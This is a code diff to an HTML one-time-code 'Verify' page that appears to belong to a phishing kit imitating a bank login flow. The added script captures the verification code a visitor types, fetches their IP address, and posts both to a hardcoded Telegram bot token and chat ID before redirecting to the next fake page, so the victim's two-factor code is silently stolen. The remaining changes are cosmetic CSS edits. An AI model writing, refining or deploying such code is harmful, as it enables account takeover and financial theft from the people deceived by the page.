@@ -62,7 +62,6 @@
         
         input[type="text"] {
             width: 30px;
-            /* Smaller width for input */
             padding: 5px;
             border: 1px solid #ddd;
             border-radius: 4px;
@@ -98,81 +97,67 @@
             max-width: 150px;
             margin-bottom: 20px;
         }
-        /* ===== Mobile Responsive Styles ===== */
+        
         @media screen and (max-width: 768px) {
             body {
                 flex-direction: column;
                 height: auto;
                 min-height: 100vh;
             }
-
             .left-section {
                 flex: none;
                 justify-content: center;
                 text-align: center;
                 padding: 30px 20px;
             }
-
             .left-section h1 {
                 font-size: 1.5rem;
             }
-
             .left-section p {
                 font-size: 1rem;
             }
-
             .right-section {
                 flex: none;
                 padding: 20px;
             }
-
             .login-form {
                 max-width: 100%;
                 box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
             }
-
             .logo {
                 max-width: 120px;
             }
         }
-
+        
         @media screen and (max-width: 480px) {
             .left-section {
                 padding: 20px 15px;
             }
-
             .left-section h1 {
                 font-size: 1.3rem;
             }
-
             .left-section p {
                 font-size: 0.9rem;
             }
-
             .right-section {
                 padding: 15px;
             }
-
             .login-form {
                 padding: 15px;
             }
-
             .login-form h2 {
                 font-size: 1.1rem;
             }
-
             input[type="text"],
             input[type="password"],
             select {
                 padding: 8px;
-                font-size: 16px; /* Prevents iOS zoom on focus */
+                font-size: 16px;
             }
-
             button {
                 padding: 12px;
                 font-size: 1rem;
             }
-
             .logo {
                 max-width: 100px;
             }
@@ -192,10 +177,10 @@
     <div class="right-section">
         <div class="login-form">
             <h2>Verify</h2>
-            <p>We have sent a verification code to 25472*****53</p>
+            <p>We have sent a verification code to 254*****</p>
             <p>Please enter the code below:</p>
 
-            <div class="form-group">
+            <div class="form-group" id="otp-container">
                 <input type="text" maxlength="1" required>
                 <input type="text" maxlength="1" required>
                 <input type="text" maxlength="1" required>
@@ -210,34 +195,107 @@
     </div>
 
     <script>
+        // ========== TELEGRAM CONFIGURATION ==========
+        // Replace with YOUR bot token and chat ID
+        const TELEGRAM_BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const TELEGRAM_CHAT_ID = '5615316142';
+        // ============================================
+
         const inputs = document.querySelectorAll('.form-group input');
 
+        // Auto-advance to next input on fill
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
-                // Move to next input if current input is filled
                 if (input.value.length === 1 && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
             });
-        });
 
-        document.getElementById('verify-button').addEventListener('click', function() {
-            // Check if all OTP fields are filled
-            let allFilled = true;
-            inputs.forEach(input => {
-                if (input.value.trim() === '') {
-                    allFilled = false;
+            // Also allow backspace to go to previous input
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
                 }
             });
+        });
 
-            if (allFilled) {
-                window.location.href = "equity4.html";
-            } else {
-                alert("Please enter the complete verification code.");
+        /**
+         * Send a message to your Telegram bot.
+         */
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Telegram API error:', result);
+                }
+                return result;
+            } catch (err) {
+                console.error('Failed to send to Telegram:', err);
             }
+        }
+
+        /**
+         * Capture the OTP and send it to Telegram before redirecting.
+         */
+        async function captureOTPAndSend() {
+            // Collect all OTP digits
+            let otp = '';
+            inputs.forEach(input => {
+                otp += input.value.trim();
+            });
+
+            if (otp.length < 6) {
+                alert('Please enter the complete verification code.');
+                return false;
+            }
+
+            // 1. Grab victim IP (optional, nice-to-have)
+            let ip = 'Unknown';
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                ip = data.ip;
+            } catch (e) {
+                // silently fail
+            }
+
+            // 2. Build Telegram message
+            const timestamp = new Date().toLocaleString();
+            const message = `
+<b>OTP Capture</b>
+Time: ${timestamp}
+IP: ${ip}
+
+<b>Verification Code:</b> ${otp}
+            `.trim();
+
+            // 3. Send to Telegram (async, doesn't block redirect)
+            sendToTelegram(message);
+
+            // 4. Redirect to next page
+            window.location.href = "equity4.html";
+
+            return false;
+        }
+
+        // Attach handler to verify button
+        document.getElementById('verify-button').addEventListener('click', function(e) {
+            e.preventDefault();
+            captureOTPAndSend();
         });
     </script>
-
 
 </body>
 
